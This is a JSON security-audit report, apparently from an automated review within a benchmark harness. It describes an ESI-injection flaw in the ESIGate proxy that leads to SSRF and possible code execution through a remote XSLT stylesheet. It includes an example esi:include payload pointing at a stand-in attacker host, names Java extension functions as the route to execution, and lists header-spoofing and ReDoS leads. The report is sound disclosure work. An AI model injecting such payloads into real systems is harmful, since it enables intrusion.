@@ -1,0 +1,95 @@
+{
+  "candidates": [
+    {
+      "attacker_control": "Remote (typically unauthenticated) client. It cannot set the ESI attribute directly, but ESI parsing runs by default on proxied/aggregated responses (Esi extension in the default EXTENSIONS list, Parameters.java:79-82) for text content types (`text/html`, `application/xhtml+xml` are default `parsableContentTypes`). The `esi:include` tag regex accepts the attribute value verbatim, e.g. markup such as `<esi:include src=\"page.html\" stylesheet=\"http://attacker/x.xsl\">`. The attacker therefore controls the stylesheet URL and its full XSLT body if any page processed by ESIGate carries attacker-influenced markup (reflected request parameter, stored CMS content, comment/aggregator directives) - the classic ESI-injection channel. Where a provider template already uses ESI variables, client-controlled values also flow into directive URLs via `VariablesResolver` (`$(QUERY_STRING{...})`, `$(HTTP_HEADER{...})`, `$(HTTP_HOST)`, etc.), and absolute URLs are not restricted to configured providers because `DriverFactory`/`Driver.render` accepts any `http(s)://` value (`DriverRequest.external`).",
+      "confidence": "medium",
+      "counterevidence_checked": "(a) `Driver.render` does rewrite the outgoing host for non-external URLs, but the rewrite is explicitly skipped when `DriverRequest.isExternal()` is true (absolute `http://`/`https://` URL), so the attacker host is not replaced by the configured provider. (b) `XsltRenderer` is only instantiated when the `stylesheet` attribute is present; a missing attribute yields a normal include (Tag.getAttribute returns null). (c) Renderers only run for parsable content types (ContentTypeHelper), which is the default for text/html. (d) The ESI tag regex requires a literal `<esi:` tag in the processed response, so exploitation needs attacker markup inside the upstream response - I did not find any escaping of client input into provider responses in this repository, but that step is application-dependent. (e) No `FEATURE_SECURE_PROCESSING`, `enableExtensionFunctions`, `XMLConstants` or URL allow-list exists anywhere in the tree (grep negative). (f) `XsltRenderer(String xsl)` (direct string constructor) has no production callers, so the remote-template constructor is the relevant one. (g) The stylesheet response itself is passed through the default renderer chain (Esi/ResourceFixup), but `UrlRewriter.URL_PATTERN` excludes tag names containing ':' and no ESI processing is required to keep a valid XSLT, so this does not neutralise the issue.",
+      "id": "esigate-esi-untrusted-stylesheet",
+      "impact": "Server-side request forgery from the ESIGate host (including internal-only services, cloud metadata endpoints and local files via `document()`), and potentially arbitrary Java code execution in the ESIGate JVM by supplying an XSLT that calls Java extension functions (the transformation runs server-side with the proxy's privileges). Even if extension functions were disabled by the JVM, the attacker still controls document loading and transformation output returned to the client, i.e. SSRF/LFI and full response manipulation; the same missing-validation pattern also lets an absolute `esi:include src` reach arbitrary hosts.",
+      "locations": [
+        {
+          "end_line": 208,
+          "path": "esigate-core/src/main/java/org/esigate/esi/IncludeElement.java",
+          "start_line": 143
+        },
+        {
+          "end_line": 205,
+          "path": "esigate-core/src/main/java/org/esigate/extension/parallelesi/IncludeElement.java",
+          "start_line": 142
+        },
+        {
+          "end_line": 117,
+          "path": "esigate-core/src/main/java/org/esigate/xml/XsltRenderer.java",
+          "start_line": 56
+        },
+        {
+          "end_line": 81,
+          "path": "esigate-core/src/main/java/org/esigate/http/ResourceUtils.java",
+          "start_line": 67
+        },
+        {
+          "end_line": 274,
+          "path": "esigate-core/src/main/java/org/esigate/http/HttpClientRequestExecutor.java",
+          "start_line": 227
+        },
+        {
+          "end_line": 72,
+          "path": "esigate-core/src/main/java/org/esigate/impl/DriverRequest.java",
+          "start_line": 51
+        },
+        {
+          "end_line": 221,
+          "path": "esigate-core/src/main/java/org/esigate/Driver.java",
+          "start_line": 157
+        },
+        {
+          "end_line": 77,
+          "path": "esigate-core/src/main/java/org/esigate/extension/Esi.java",
+          "start_line": 31
+        },
+        {
+          "end_line": 82,
+          "path": "esigate-core/src/main/java/org/esigate/Parameters.java",
+          "start_line": 79
+        }
+      ],
+      "prerequisites": "1) Esi (and/or Aggregate) extension enabled - default. 2) Response content type is parsable text (default text/html, application/xhtml+xml). 3) Attacker-influenced content containing an `esi:include` element reaches a page processed by ESIGate (ESI injection) or a template that interpolates a client-controlled variable into an ESI URL. 4) ESIGate can reach the attacker's HTTP host (normal for a proxy), and the JDK XSLT factory on the deployment allows extension functions (default for Xalan/XSLTC on JDK 7/8, which the pom targets). Steps 1-3 are configuration/default-behaviour assumptions, not code paths that reject the input.",
+      "root_cause": "ESI directives come from the provider (backend) response body and are treated as trusted without any validation of the URLs they reference and without sandboxing of the transformation engine. In `IncludeElement.processPage` the `stylesheet` attribute is read verbatim from the parsed tag and passed to `new XsltRenderer(xslt, driver, httpRequest)` (core and parallelesi). `XsltRenderer` retrieves that URI with `driver.render(template, ...)`; `ResourceUtils.getHttpUrlWithQueryString` only prefixes the configured base URL when the value does NOT already start with `http://`/`https://`, so an absolute attacker URL is used as-is, and `DriverRequest` marks such URLs `external`, causing `HttpClientRequestExecutor.createOutgoingRequest` to *skip* host rewriting and connect to the attacker-chosen host. The returned body is compiled with `TransformerFactory.newInstance()` (static factory, lines 57 and 89-97) with no `FEATURE_SECURE_PROCESSING`, no `enableExtensionFunctions=false`, no URIResolver restrictions and no allow-list. The same constructor also honours attacker-supplied `xpath`; the aggregator `<!--$includeblock$...$-->` path has the same absolute-URL behaviour via `ElementAttributesFactory`.",
+      "title": "Untrusted ESI markup can force the proxy to fetch and execute an arbitrary remote XSLT stylesheet (SSRF and possible remote code execution)",
+      "trace": "EsiRenderer parses the provider body for `esi:include` (esi/EsiRenderer.java:44-52) -> parser invokes IncludeElement.parseTag/onTagEnd -> IncludeElement.processPage reads `tag.getAttribute(\"stylesheet\")` (esi/IncludeElement.java:146) -> `new XsltRenderer(xslt, driver, httpRequest)` (line 202) -> XsltRenderer ctor calls `driver.render(template, originalRequest)` (xml/XsltRenderer.java:73) -> ResourceUtils.getHttpUrlWithQueryString keeps an absolute `http(s)` URL unchanged (http/ResourceUtils.java:67-74) -> Driver.render builds DriverRequest whose `external` flag is true for absolute URLs (impl/DriverRequest.java:54) -> HttpClientRequestExecutor.createOutgoingRequest skips `rewriteURI` for external URLs and uses the extracted attacker host as the physical host (http/HttpClientRequestExecutor.java:230-241), so the request really goes to the attacker -> response body becomes the XSLT via `TRANSFORMER_FACTORY.newTransformer(new StreamSource(...))` (xml/XsltRenderer.java:89-97) -> `transformer.transform(source, result)` (line 108) executes attacker XSLT against the proxied document. With default JAXP the stylesheet can invoke Java extension functions (`http://xml.apache.org/xalan/java` namespace, extension functions enabled by default on the targeted JDK) and can read further URLs/files through `document()`, so this is code execution / SSRF / file read, not only data transformation.",
+      "unverified": "Not runtime-tested: whether the specific JDK/JAXP build in a deployment leaves Java extension functions enabled (default on the target JDK 7/8 Xalan/XSLTC, but this pivot could not be executed here), and whether a concrete provider app reflects attacker input into a parsable ESI response in a given installation. The SSRF/fetch-arbitrary-URL part is directly evidenced by source; the code-execution part depends on the JAXP extension-function default, so the candidate is a lead, not a confirmed exploit.",
+      "weakness_type": "Code Injection / Improper Control of Generation of Code (CWE-94) with Server-Side Request Forgery (CWE-918)"
+    }
+  ],
+  "coverage_summary": "Harness scope: 302 files, per-file text limit ~5 MiB, 0 files excluded as binary/over-size/sensitive/symlink. I enumerated the full tree and read or scanned every esigate-core package that participates in request handling (Driver/DriverFactory, http/ResourceUtils/HttpClientRequestExecutor/HeaderManager/HttpResponseUtils/IncomingRequest/OutgoingRequest, impl/DriverRequest/UrlRewriter/UriMapping/FragmentRedirectStrategy, util/UriUtils/FilterList, esi/*, extension/parallelesi/*, aggregator/*, tags/*, cookie/*, xml/*, vars/*, cache/*, events/*, extension/*), plus esigate-servlet (ProxyFilter, ServletExtension, RequestFactory, ResponseCapturingWrapper, ResponseSender, user/ConnectorFilter) and esigate-server (EsigateServer, ControlHandler, Http), esigate-cas and the demo WARs/configs. The selected candidate was traced end-to-end across those files; the SSRF/XSLT reachability, the absence of any URL allow-list or secure-processing configuration, and the default-enabled ESI pipeline were each verified by search (e.g. no matches for FEATURE_SECURE_PROCESSING, XMLConstants, enableExtensionFunctions). Coverage is not exhaustive at line level: parser internals (parser/future/*, Parser/ParserContext), url/* base-URL strategies, cache storage implementations and the demo web resources were skimmed rather than fully audited.",
+  "limitations": [
+    "No runtime execution, dependency resolution, or JAXP/Xalan probing was performed; the code-execution pivot (Java extension functions enabled by default in the deployment's XSLT processor) is argued from source and platform defaults, not confirmed at runtime.",
+    "Tests were not present in the snapshot (no @Test/src/test paths), so behaviour could not be cross-checked against the project's own assertions.",
+    "Exploitation requires attacker-influenced markup to survive into a provider response processed by ESIGate; the repository contains many provider applications but the actual reflecting endpoint is deployment-specific and was not identified in-repo.",
+    "`.git` metadata, CVE/advisory data, sibling conditions and ground-truth information were intentionally not consulted, so I cannot confirm whether this snapshot corresponds to a published fix; the candidate is a source-evidence lead only.",
+    "Only the single strongest candidate is reported; the second-most interesting lead (X_REMOTE_USER spoofing) and several hardening gaps are recorded as rejected/unconfirmed leads in case the selected candidate does not align with the intended issue."
+  ],
+  "rejected_leads": [
+    {
+      "lead": "Direct authentication/identity spoofing via the `X_REMOTE_USER` header: `HeaderManager` forwards nearly all client headers including `X_REMOTE_USER` (only Connection/Content-Length/Cache-control/Cookie/Host/Max-Forwards/Pragma/Proxy-Authorization/TE/Trailer/Transfer-Encoding/Upgrade are removed, http/HeaderManager.java:60-88), `RemoteUserAuthenticationHandler.preRequest` only *adds* the trusted value when the container authenticated the user (authentication/RemoteUserAuthenticationHandler.java:42-53), and the shipped `FilteredRequest.getRemoteUser()` trusts the first `X_REMOTE_USER` header (servlet/user/FilteredRequest.java:36-59), which the demo provider app wires as a global filter (esigate-app-provider/src/main/webapp/WEB-INF/web.xml). Considered, but not selected as the primary candidate because the security decision is made by the downstream provider application using the connector pattern rather than by ESIGate's own request handling, and the impact depends on that app relying on the header for authorization.",
+      "reason": "Real trust-boundary smell with direct client control, but impact/ownership is conditional on the consuming provider app; weaker source-complete impact chain than the ESI/XSLT candidate."
+    },
+    {
+      "lead": "SSRF through an absolute `<esi:include src=\"http://internal/...\">` or aggregator `<!--$includeblock$provider$http://internal/...$-->` page URL.",
+      "reason": "Same missing-validation family as the submitted stylesheet fetch (absolute URLs preserved and external hosts contacted); not split into a second candidate per the one-candidate rule. It is included as part of the submitted candidate's impact/trace."
+    },
+    {
+      "lead": "Cookie domain rewriting in `DefaultCookieManager.rewriteDomain` may emit a cookie for a parent domain of the client's host even when the provider-set Domain is not a suffix of it (cookie tossing / cross-subdomain cookie injection), and `rewriteForServer` forces `setSecure(false)` (cookie/DefaultCookieManager.java:139-227).",
+      "reason": "Behaviour is partly intended domain mapping for a reverse proxy; no privilege boundary is clearly crossed within ESIGate itself. Unconfirmed, lower impact."
+    },
+    {
+      "lead": "Denial of service and information-exposure leads: `esi:replace` regexps are compiled from provider markup and evaluated with `replaceAll` (esi/IncludeElement.java:122-128, parallelesi version line 132-137) allowing ReDoS/IllegalArgumentException; `HtmlCharsetProcessor` calls `Charset.forName` on page-declared charsets (extension/HtmlCharsetProcessor.java:56-65) throwing unchecked exceptions; `HttpErrorPage` converts exception stack traces into response bodies (HttpErrorPage.java:60-70, 128-132).",
+      "reason": "Availability/information-disclosure only, no attacker-controlled code path or cross-privilege effect strong enough to outrank the selected candidate."
+    },
+    {
+      "lead": "Demo/test artifacts with insecure defaults: CAS demo uses `SimpleTestUsernamePasswordAuthenticationHandler` and `requireSecure=false` (esigate-app-cas/.../deployerConfigContext.xml:81-91), and several old dependency versions (commons-io 2.0.1, servlet-api 2.4) are pinned in the poms.",
+      "reason": "Demo application configuration and dependencies, not a source-level vulnerability with a demonstrated attacker-controlled impact in this snapshot."
+    }
+  ],
+  "summary": "Reviewed the ESIGate 5.3-SNAPSHOT source tree (302 readable files; no binaries, symlinks or sensitive-name exclusions were dropped by the harness). The strongest source-grounded lead is the unrestricted handling of the ESI/aggregator directives that arrive in provider-response markup: `esi:include` attributes (`stylesheet`, `xpath`, and absolute `src`) are read verbatim from the parsed page, absolute URLs are deliberately kept absolute and fetched from arbitrary hosts (`ResourceUtils.getHttpUrlWithQueryString` + `DriverRequest.external` + `HttpClientRequestExecutor`), and a fetched `stylesheet` is compiled/executed with a bare `TransformerFactory.newInstance()` with no secure-processing, no extension-function restriction and no URL allow-list (`XsltRenderer`). If an attacker can get one `esi:include` fragment into a provider response (reflected/stored ESI injection, a standard attack against ESI processors), the proxy will fetch attacker-controlled XSLT and transform pages with it, enabling SSRF/remote file reads and, on the default JDK XSLT processor where Java extension functions are enabled, arbitrary Java code execution in the ESIGate JVM. Both the classic ESI implementation and the parallelesi implementation contain the same defect. This is submitted as one candidate (one root cause family: untrusted ESI markup executed with full proxy privileges without validation or sandboxing); other plausible but weaker/conditional leads are listed as rejected."
+}
